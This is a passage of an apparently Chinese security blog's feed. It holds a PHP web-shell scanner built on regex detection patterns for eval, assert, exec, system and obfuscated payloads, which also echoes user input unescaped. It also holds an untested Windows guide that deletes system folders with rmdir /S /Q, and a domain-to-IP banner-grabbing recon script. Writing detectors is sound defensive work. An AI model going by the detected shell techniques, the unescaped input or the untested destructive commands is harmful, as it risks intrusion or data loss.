html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">'gb2312'</span>&gt;</span><br><span class="line">        &lt;title&gt;PHP web shell scan&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">define(<span class="string">"SELF"</span>,php_self());        </span><br><span class="line">error_reporting(E_ERROR);</span><br><span class="line">ini_set(<span class="string">'max_execution_time'</span>,<span class="number">20000</span>);</span><br><span class="line">ini_set(<span class="string">'memory_limit'</span>,<span class="string">'512M'</span>);</span><br><span class="line">header(<span class="string">"content-Type: text/html; charset=gb2312"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">weevelyshell</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">        $content=file_get_contents($file);</span><br><span class="line">        <span class="keyword">if</span>( </span><br><span class="line">                (</span><br><span class="line">                preg_match(<span class="string">'#(\$\w&#123;2,4&#125;\s?=\s?str_replace\("\w+","","[\w_]+"\);\s?)+#s'</span>,$content)&amp;&amp;</span><br><span class="line">            preg_match(<span class="string">'#(\$\w&#123;2,4&#125;\s?=\s?"[\w\d\+\/\=]+";\s?)+#'</span>,$content)&amp;&amp;                             preg_match(<span class="string">'#\$[\w]&#123;2,4&#125;\s?=\s\$[\w]&#123;2,4&#125;\(\'\',\s?\$\w&#123;2,4&#125;\(\$\w&#123;2,4&#125;\("\w&#123;1,4&#125;",\s?"",\s?\$\w&#123;2,4&#125;\.\$\w&#123;2,4&#125;\.\$\w&#123;2,4&#125;\.\$\w&#123;2,4&#125;\)\)\);\s+?\$\w&#123;2,4&#125;\(\)\;#'</span>,$content))</span><br><span class="line">                    ||</span><br><span class="line">                    (preg_match(<span class="string">'#\$\w+\d\s?=\s?str_replace\(\"[\w\d]+\",\"\",\"[\w\d]+\"\);#s'</span>,$content)&amp;&amp;</span><br><span class="line">                preg_match(<span class="string">'#\$\w+\s?=\s?\$[\w\d]+\(\'\',\s?\$[\w\d]+\(\$\w+\(\$\w+\(\"[[:punct:]]+\",\s?\"\",\s?\$\w+\.\$\w+\.\$\w+\.\$\w+\)\)\)\);\s?\$\w+\(\);#s'</span>,$content))</span><br><span class="line">                )&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callbackshell</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">        $content=file_get_contents($file);</span><br><span class="line">        <span class="keyword">if</span>(</span><br><span class="line">                preg_match(<span class="string">'#\$\w+\s?=\s?\$_(?:GET|POST|REQUEST|COOKIE|SERVER)\[.*?\]#is'</span>,$content)&amp;&amp;</span><br><span class="line">                preg_match(<span class="string">'#\$\w+\s?=\s?(?:new)?\s?array\w*\s?\(.*?_(?:GET|POST|REQUEST|COOKIE|SERVER)\[.*?\].*?\)+#is'</span>,$content)&amp;&amp;</span><br><span class="line">                preg_match(<span class="string">'#(?:array_(?:reduce|map|udiff|walk|walk_recursive|filter)|u[ak]sort)\s?\(.*?\)+?#is'</span>,$content)</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">                )</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">php_self</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $php_self=substr($_SERVER[<span class="string">'PHP_SELF'</span>],strrpos($_SERVER[<span class="string">'PHP_SELF'</span>],<span class="string">'/'</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $php_self;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$matches = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'/mb_ereg_replace\([\'\*\s\,\.\"]+\$_(?:GET|POST|REQUEST|COOKIE|SERVER)\[[\'\"].*?[\'\"][\]][\,\s\'\"]+e[\'\"]'</span>/is,</span><br><span class="line">                <span class="string">'/preg_filter\([\'\"\|\.\*e]+.*\$_(?:GET|POST|REQUEST|COOKIE|SERVER)/is'</span>,</span><br><span class="line">                <span class="string">'/create_function\s?\(.*assert\(/is'</span>,</span><br><span class="line">                <span class="string">'/ini_get\(\'safe_mode\'\)/i'</span>,</span><br><span class="line">                <span class="string">'/get_current_user\(.*?\)/i'</span>,</span><br><span class="line">                <span class="string">'/@?assert\s?\(\$.*?\)/i'</span>,</span><br><span class="line">                <span class="string">'/proc_open\s?\(.*?pipe\',\s?\'w\'\)/is'</span>,</span><br><span class="line">        <span class="string">'/sTr_RepLaCe\s?\([\'\"].*?[\'\"],[\'\"].*?[\'\"]\s?,\s?\'a[[:alnum:][:punct:]]+?s[[:alnum:][:punct:]]+?s[[:alnum:][:punct:]]+?e[[:alnum:][:punct:]]+?r[[:alnum:][:punct:]]+?t[[:alnum:][:punct:]]+?\)/i'</span>,</span><br><span class="line">                <span class="string">'/preg_replace_callback\(.*?create_function\(/is'</span>,</span><br><span class="line">                <span class="string">'/filter_var(?:_array)?\s?.*?\$_(?:GET|POST|REQUEST|COOKIE|SERVER)\[[\'\"][[:punct:][:alnum:]]+[\'\"]\][[:punct:][:alnum:][:space:]]+?assert[\'\"]\)/is'</span>,</span><br><span class="line">                <span class="string">'/ob_start\([\'\"]+assert[\'\"]+\)/is'</span>,</span><br><span class="line">                <span class="string">'/new\s?ReflectionFunction\(.*?-&gt;invoke\(/is'</span>,</span><br><span class="line">            <span class="string">'/PDO::FETCH_FUNC/'</span>,</span><br><span class="line">                <span class="string">'/\$\w+.*\s?(?:=|-&gt;)\s?.*?[\'\"]assert[\'\"]\)?/i'</span>,</span><br><span class="line">                <span class="string">'/\$\w+-&gt;(?:sqlite)?createFunction\(.*?\)/i'</span>,</span><br><span class="line">                <span class="string">'/eval\([\"\']?\\\?\$\w+\s?=\s?.*?\)/i'</span>,</span><br><span class="line">                <span class="string">'/eval\(.*?gzinflate\(base64_decode\(/i'</span>,</span><br><span class="line">                <span class="string">'/copy\(\$HTTP_POST_FILES\[\'\w+\'\]\s?\[\'tmp_name\'\]/i'</span>,</span><br><span class="line">                <span class="string">'/register_(?:shutdown|tick)_function\s?\(\$\w+,\s\$_(?:GET|POST|REQUEST|COOKIE|SERVER)\[.*?\]\)/is'</span>,</span><br><span class="line">                <span class="string">'/register_(?:shutdown|tick)_function\s?\(?[\'\"]assert[\"\'].*?\)/i'</span>,</span><br><span class="line">                <span class="string">'/call_user_func.*?\([\"|\']assert[\"|\'],.*\$_(?:GET|POST|REQUEST|COOKIE|SERVER)\[[\'|\"].*\]\)+/is'</span>,</span><br><span class="line">            <span class="string">'/preg_replace\(.*?e.*?\'\s?,\s?.*?\w+\(.*?\)/i'</span>,</span><br><span class="line">        <span class="string">'/function_exists\s*\(\s*[\'|\"](popen|exec|proc_open|system|passthru)+[\'|\"]\s*\)/i'</span>,</span><br><span class="line">        <span class="string">'/(exec|shell_exec|system|passthru)+\s*\(\s*\$_(\w+)\[(.*)\]\s*\)/i'</span>,</span><br><span class="line">        <span class="string">'/(exec|shell_exec|system|passthru)+\s*\(\$\w+\)/i'</span>,</span><br><span class="line">        <span class="string">'/(exec|shell_exec|system|passthru)\s?\(\w+\(\"http_.*\"\)\)/i'</span>,</span><br><span class="line">                  <span class="string">'/(?:john\.barker446@gmail\.com|xb5@hotmail\.com|shopen@aventgrup\.net|milw0rm\.com|www\.aventgrup\.net|mgeisler@mgeisler\.net)/i'</span>,</span><br><span class="line">            <span class="string">'/Php\s*?Shell/i'</span>,</span><br><span class="line">        <span class="string">'/((udp|tcp)\:\/\/(.*)\;)+/i'</span>,</span><br><span class="line">        <span class="string">'/preg_replace\s*\((.*)\/e(.*)\,\s*\$_(.*)\,(.*)\)/i'</span>,</span><br><span class="line">        <span class="string">'/preg_replace\s*\((.*)\(base64_decode\(\$/i'</span>,</span><br><span class="line">        <span class="string">'/(eval|assert|include|require|include_once|require_once)+\s*\(\s*(base64_decode|str_rot13|gz(\w+)|file_(\w+)_contents|(.*)php\:\/\/input)+/i'</span>,</span><br><span class="line">        <span class="string">'/(eval|assert|include|require|include_once|require_once|array_map|array_walk)+\s*\(.*?\$_(?:GET|POST|REQUEST|COOKIE|SERVER|SESSION)+\[(.*)\]\s*\)/i'</span>,</span><br><span class="line">        <span class="string">'/eval\s*\(\s*\(\s*\$\$(\w+)/i'</span>,</span><br><span class="line">            <span class="string">'/((?:include|require|include_once|require_once)+\s*\(?\s*[\'|\"]\w+\.(?!php).*[\'|\"])/i'</span>,</span><br><span class="line">        <span class="string">'/\$_(\w+)(.*)(eval|assert|include|require|include_once|require_once)+\s*\(\s*\$(\w+)\s*\)/i'</span>,</span><br><span class="line">        <span class="string">'/\(\s*\$_FILES\[(.*)\]\[(.*)\]\s*\,\s*\$_(GET|POST|REQUEST|FILES)+\[(.*)\]\[(.*)\]\s*\)/i'</span>,</span><br><span class="line">        <span class="string">'/(fopen|fwrite|fputs|file_put_contents)+\s*\((.*)\$_(GET|POST|REQUEST|COOKIE|SERVER)+\[(.*)\](.*)\)/i'</span>,</span><br><span class="line">        <span class="string">'/echo\s*curl_exec\s*\(\s*\$(\w+)\s*\)/i'</span>,</span><br><span class="line">        <span class="string">'/new com\s*\(\s*[\'|\"]shell(.*)[\'|\"]\s*\)/i'</span>,</span><br><span class="line">        <span class="string">'/\$(.*)\s*\((.*)\/e(.*)\,\s*\$_(.*)\,(.*)\)/i'</span>,</span><br><span class="line">        <span class="string">'/\$_\=(.*)\$_/i'</span>,</span><br><span class="line">        <span class="string">'/\$_(GET|POST|REQUEST|COOKIE|SERVER)+\[(.*)\]\(\s*\$(.*)\)/i'</span>,</span><br><span class="line">        <span class="string">'/\$(\w+)\s*\(\s*\$_(GET|POST|REQUEST|COOKIE|SERVER)+\[(.*)\]\s*\)/i'</span>,</span><br><span class="line">        <span class="string">'/\$(\w+)\s*\(\s*\$\&#123;(.*)\&#125;/i'</span>,</span><br><span class="line">        <span class="string">'/\$(\w+)\s*\(\s*chr\(\d+\)/i'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">antivirus</span><span class="params">($dir,$exs,$matches)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(($handle = @opendir($dir)) == <span class="keyword">NULL</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">false</span> !== ($name = readdir($handle))) &#123;</span><br><span class="line">                <span class="keyword">if</span>($name == <span class="string">'.'</span> || $name == <span class="string">'..'</span>) <span class="keyword">continue</span>;</span><br><span class="line">                $path = $dir.$name;</span><br><span class="line">                <span class="keyword">if</span>(strstr($name,<span class="keyword">SELF</span>)) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="comment">//$path=iconv("UTF-8","gb2312",$path);</span></span><br><span class="line">                <span class="keyword">if</span>(is_dir($path)) &#123;</span><br><span class="line">                        <span class="comment">//chmod($path,0777);/*主要针对一些0111的目录*/</span></span><br><span class="line">                        <span class="keyword">if</span>(is_readable($path)) antivirus($path.<span class="string">'/'</span>,$exs,$matches);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(strpos($name,<span class="string">';'</span>) &gt; <span class="number">-1</span> || strpos($name,<span class="string">'%00'</span>) &gt; <span class="number">-1</span> || strpos($name,<span class="string">'/'</span>) &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">'特征 &lt;input type="text" style="width:250px;" value="解析漏洞"&gt;         '</span>.$path.<span class="string">'&lt;div&gt;&lt;/div&gt;'</span>; flush(); ob_flush();</span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span>(!preg_match($exs,$name)) <span class="keyword">continue</span>;</span><br><span class="line">                        <span class="keyword">if</span>(filesize($path) &gt; <span class="number">10000000</span>) <span class="keyword">continue</span>;</span><br><span class="line">                        $fp = fopen($path,<span class="string">'r'</span>);</span><br><span class="line">                        $code = fread($fp,filesize($path));</span><br><span class="line">                        fclose($fp);</span><br><span class="line">                        <span class="keyword">if</span>(<span class="keyword">empty</span>($code)) <span class="keyword">continue</span>;                     </span><br><span class="line">                        <span class="keyword">if</span>(weevelyshell($path))&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">'特征 &lt;input type="text" style="width:250px;" value="weevely 加密shell"&gt;         '</span>.$path.<span class="string">'&lt;div&gt;&lt;/div&gt;'</span>; flush(); ob_flush();</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">elseif</span>(callbackshell($path))&#123;</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">'特征 &lt;input type="text" style="width:250px;" value="Callback shell"&gt;         '</span>.$path.<span class="string">'&lt;div&gt;&lt;/div&gt;'</span>; flush(); ob_flush();</span><br><span class="line">                &#125;</span><br><span class="line">                        <span class="keyword">foreach</span>($matches <span class="keyword">as</span> $matche) &#123;</span><br><span class="line">                                $array = <span class="keyword">array</span>();</span><br><span class="line">                                preg_match($matche,$code,$array);</span><br><span class="line">                                <span class="keyword">if</span>(!$array) <span class="keyword">continue</span>;</span><br><span class="line">                                <span class="keyword">if</span>(strpos($array[<span class="number">0</span>],<span class="string">"\x24\x74\x68\x69\x73\x2d\x3e"</span>)) <span class="keyword">continue</span>;</span><br><span class="line">                                $len = strlen($array[<span class="number">0</span>]);</span><br><span class="line">                                <span class="keyword">if</span>($len &gt; <span class="number">6</span> &amp;&amp; $len &lt; <span class="number">200</span>) &#123;</span><br><span class="line">                                        <span class="keyword">echo</span> <span class="string">'特征 &lt;input type="text" style="width:250px;" value="'</span>.htmlspecialchars($array[<span class="number">0</span>]).<span class="string">'"&gt;        '</span>.$path.<span class="string">'&lt;div&gt;&lt;/div&gt;'</span>;</span><br><span class="line">                                        flush(); ob_flush(); <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">unset</span>($code,$array);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        closedir($handle);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strdir</span><span class="params">($str)</span> </span>&#123; <span class="keyword">return</span> str_replace(<span class="keyword">array</span>(<span class="string">'\\'</span>,<span class="string">'//'</span>,<span class="string">'//'</span>),<span class="keyword">array</span>(<span class="string">'/'</span>,<span class="string">'/'</span>,<span class="string">'/'</span>),chop($str)); &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;form method="POST"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'路径: &lt;input type="text" name="dir" value="'</span>.($_POST[<span class="string">'dir'</span>] ? strdir($_POST[<span class="string">'dir'</span>].<span class="string">'/'</span>) : strdir($_SERVER[<span class="string">'DOCUMENT_ROOT'</span>].<span class="string">'/'</span>)).<span class="string">'" style="width:398px;"&gt;&lt;div&gt;&lt;/div&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'后缀: &lt;input type="text" name="exs" value="'</span>.($_POST[<span class="string">'exs'</span>] ? $_POST[<span class="string">'exs'</span>] : <span class="string">'.php|.inc|.phtml'</span>).<span class="string">'" style="width:398px;"&gt;&lt;div&gt;&lt;/div&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'操作: &lt;input type="submit" style="width:80px;" value="scan"&gt;&lt;div&gt;&lt;/div&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(file_exists($_POST[<span class="string">'dir'</span>]) &amp;&amp; $_POST[<span class="string">'exs'</span>]) &#123;</span><br><span class="line">        $dir = strdir($_POST[<span class="string">'dir'</span>].<span class="string">'/'</span>);</span><br><span class="line">        $exs = <span class="string">'/('</span>.str_replace(<span class="string">'.'</span>,<span class="string">'\\.'</span>,$_POST[<span class="string">'exs'</span>]).<span class="string">')/i'</span>;</span><br><span class="line">        <span class="keyword">echo</span> antivirus($dir,$exs,$matches) ? <span class="string">'&lt;/br &gt;&lt;div&gt;&lt;/div&gt;扫描完毕!'</span> : <span class="string">'&lt;/br &gt; &lt;div&gt;&lt;/div&gt;扫描中断'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>windows 7 小容量ssd硬盘解决方案</title>
      <link href="/2015/05/24/Small-ssd/"/>
      <url>/2015/05/24/Small-ssd/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.t00ls.net/thread-28547-1-1.html" target="_blank" rel="noopener">文章发表于T00ls</a><br><a href="http://www.tomshardware.com/faq/id-1934205/move-users-programfiles-x86-programdata-hdd-installing-windows-ssd-boot-drive.html" target="_blank" rel="noopener">参考资料</a></p><p>超级本 通常都设计 得 小、薄、待机长、开机速度快<br>体积小 功耗小 就得牺牲 硬件性能<br>通常超级本 都配置一个 小容量的(固态硬盘) ssd 我测试的机器固态硬盘体积22GB 左右( thinkpad x230s)<br>完全不能愉快的 安装一个正常版的win7</p><p>我们可以把系统相关目录转移到 大的磁盘(机械)分区</p><p>c: 盘为系统盘 固态硬盘 (ssd)<br>d: 盘为软件安装盘 机械硬盘(hdd)</p><p>在安装系统时(非ghos安装)</p><p>切记：<br>最后一次重启，系统要求设置用户名和密码时候<br>按住 <strong>shitf+f10</strong> 进入命令行 执行下面命令</p><p>一定不要在 系统以安装完成作以下操作 否则会出现故障</p><blockquote><p>以下命令纯手敲 未经过验证 非专业人士请勿使用<br>在使用过程中一定要注意盘符 有可能 d:为u盘<br>命令行 运行 <strong>compmgmt.msc</strong> 或<strong>diskpart</strong> 命令 进行磁盘管理 重新分配盘符</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">robocopy &quot;C:\Users&quot; &quot;D:\Users&quot; /E /COPYALL /XJ /V /ZB</span><br><span class="line">robocopy &quot;C:\Program Files&quot; &quot;D:\Program Files&quot; /E /COPYALL /XJ /V /ZB</span><br><span class="line">robocopy &quot;C:\Program Files (x86)&quot; &quot;D:\Program Files (x86)&quot; /E /COPYALL /XJ /V /ZB</span><br><span class="line">robocopy &quot;C:\ProgramData&quot; &quot;D:\ProgramData&quot; /E /COPYALL /XJ /V /ZB</span><br><span class="line">rmdir &quot;C:\Users&quot; /S /Q</span><br><span class="line">rmdir &quot;C:\Program Files&quot; /S /Q</span><br><span class="line">rmdir &quot;C:\Program Files (x86)&quot; /S /Q</span><br><span class="line">rmdir &quot;C:\ProgramData&quot; /S /Q</span><br><span class="line">mklink /J &quot;C:\Users&quot; &quot;D:\Users&quot;</span><br><span class="line">mklink /J &quot;C:\Program Files&quot; &quot;D:\Program Files&quot;</span><br><span class="line">mklink /J &quot;C:\Program Files (x86)&quot; &quot;D:\Program Files (x86)&quot;</span><br><span class="line"></span><br><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion /v CommonFilesDir /t REG_SZ /d &quot;d:\Program Files\Common Files&quot; /f</span><br><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion /v &quot;CommonFilesDir (x86)&quot; /t REG_SZ /d &quot;d:\Program Files (x86)\Common Files&quot; /f</span><br><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion /v CommonW6432Dir /t REG_SZ /d &quot;d:\Program Files\Common Files&quot; /f</span><br><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion /v programfilesdir /t REG_SZ /d &quot;d:\Program Files&quot; /f</span><br><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion /v &quot;programfilesdir (x86)&quot; /t REG_SZ /d &quot;d:\Program Files (x86)&quot; /f</span><br><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion /v programw6432dir /t REG_SZ /d &quot;d:\Program Files&quot; /f</span><br><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows&quot; &quot;NT\CurrentVersion\ProfileList /v ProfilesDirectory /t REG_EXPAND_SZ /d d:\Users /f</span><br><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows&quot; &quot;NT\CurrentVersion\ProfileList /v Default /t REG_EXPAND_SZ /d d:\Users\Default /f</span><br><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows&quot; &quot;NT\CurrentVersion\ProfileList /v Public  /t REG_EXPAND_SZ /d d:\Users\Public /f</span><br><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows&quot; &quot;NT\CurrentVersion\ProfileList /v ProgramData /t REG_EXPAND_SZ /d d:\ProgramData /f</span><br></pre></td></tr></table></figure><p>进入系统后 以管理员权限 运行cmd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rmdir &quot;C:\ProgramData&quot; /S /Q</span><br><span class="line"></span><br><span class="line">mklink /J &quot;C:\ProgramData&quot; &quot;D:\ProgramData&quot;</span><br></pre></td></tr></table></figure><p>或以当前用户运行(未验证该方法)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">takeown /f &quot;c:\ProgramData&quot; /r /d y  &amp;&amp; icacls &quot;c:\ProgramData&quot; /grant %USERNAME%:F /T &amp;&amp; rmdir c:\ProgramData /s /q &amp;&amp;  mklink /J &quot;C:\ProgramData&quot; &quot;D:\ProgramData&quot;</span><br></pre></td></tr></table></figure><p>查看c 盘隐藏文件 我们会发现 有两个可恶的文件 占数GB 甚至数十GB 磁盘空间！<br>分别是 <strong>pagefile.sys</strong> <strong>hiberfil.sys</strong></p><p>用如下方法 移动 或清理它<br>清理windows 7 休眠文件 关闭休眠</p><p>powercfg -h off<br>清理 移动虚拟内存文件 管理员 权限运行命令行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic pagefileset list /format:list 查看 虚拟内存设置</span><br><span class="line">wmic pagefileset create name=&apos;d:\pagefile.sys&apos;,initialsize=0,maximumsize=0</span><br><span class="line">wmic pagefileset where&quot;name=&apos;c:\\pagefile.sys&apos;&quot; delete</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 电脑基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>批量域名转ip及相关信息</title>
      <link href="/2015/05/24/host2ip/"/>
      <url>/2015/05/24/host2ip/</url>
      
        <content type="html"><![CDATA[<p>功能描述：<br>将大量的域名转换成ip 按ip排序 并获取服务器基本信息</p><p>使用场景：<br>如某个大型网络 我们获取了数千子域名<br>有多个网段<br>我们通过ip 以及服务器基本信息 判断 域名所对应的网段 及所采用的 WebServer 服务器 版本</p><p>该脚本采用 多进程技术 加快了转换速度<br>控制超时时间 防止 执行卡死 丢弃 无法访问的 ip<br>使用前请确认您dns 解析速度够快<br>建议将dns 设置为 <code>8.8.8.8</code> 或<code>114.114.114.114</code><br>或挂海外vpn<br>以获取最佳结果<br>由于该脚本使用<code>wmi</code> 控制多进程所以仅支持<strong>windows</strong>，<strong>linux</strong>下用其它技术实现<br>该脚本调用php 模块：<code>pdo_sqlite</code> <code>curl</code> 使用前请确认 您的php 开启相关模块<br>使用前请不要修改文件名字</p><p>windows 命令行下：</p><p><code>commandline &gt; php host2ip.php host.txt</code><br><strong>host.txt</strong> 为多个 网站域名文件<br>执行完毕将会在当前目录生成<strong>result.txt</strong>的结果文件</p><p><strong>resolveip.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">isset</span>($argv[<span class="number">1</span>]) ? $host = trim($argv[<span class="number">1</span>]) : <span class="keyword">exit</span>();</span><br><span class="line"><span class="keyword">include</span> <span class="string">'sqlite.php'</span>;</span><br><span class="line">$sql = <span class="keyword">new</span> sqllite();</span><br><span class="line">$result = _gethostbyname($host);</span><br><span class="line"></span><br><span class="line"><span class="comment">//域名转ip</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_gethostbyname</span><span class="params">($host)</span> </span>&#123;</span><br><span class="line">    $ip = gethostbyname($host);</span><br><span class="line">    <span class="keyword">if</span> (chk_ip($ip)) &#123;</span><br><span class="line">        $i[<span class="string">'host'</span>] = $host;</span><br><span class="line">        $i[<span class="string">'ip'</span>] = $ip;</span><br><span class="line">        <span class="keyword">return</span> $i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($result[<span class="string">'ip'</span>])) &#123;</span><br><span class="line">    $sc = $sql-&gt;server_ip_exit($result[<span class="string">'ip'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($sc != <span class="number">0</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        $serv = $sql-&gt;get_server($result[<span class="string">'ip'</span>]);</span><br><span class="line">        $sql-&gt;insert($result[<span class="string">'host'</span>], $result[<span class="string">'ip'</span>], $serv);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        $server = get_server($result[<span class="string">'ip'</span>]);</span><br><span class="line">        $sql-&gt;insert($result[<span class="string">'host'</span>], $result[<span class="string">'ip'</span>], $server);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_server</span><span class="params">($host)</span> </span>&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $host);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="keyword">true</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_NOBODY, <span class="keyword">true</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_USERAGENT, <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A'</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">5</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, <span class="number">5</span>);</span><br><span class="line">    </span><br><span class="line">    $head = curl_exec($ch);</span><br><span class="line">    preg_match_all(<span class="string">'/^(?:Server|X-Powered-By):\s([^[:cntrl:]]+)/im'</span>, $head, $server);</span><br><span class="line">    $info = $server[<span class="number">1</span>];</span><br><span class="line">    $c = count($info);</span><br><span class="line">    <span class="keyword">empty</span>($info) ? $banner = <span class="keyword">false</span> : $banner = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">if</span> ($banner &amp;&amp; $c != <span class="number">0</span>) &#123;</span><br><span class="line">        $c == <span class="number">2</span> ? $return = $info[<span class="number">0</span>] . <span class="string">' | '</span> . $info[<span class="number">1</span>] : $return = $info[<span class="number">0</span>];</span><br><span class="line">    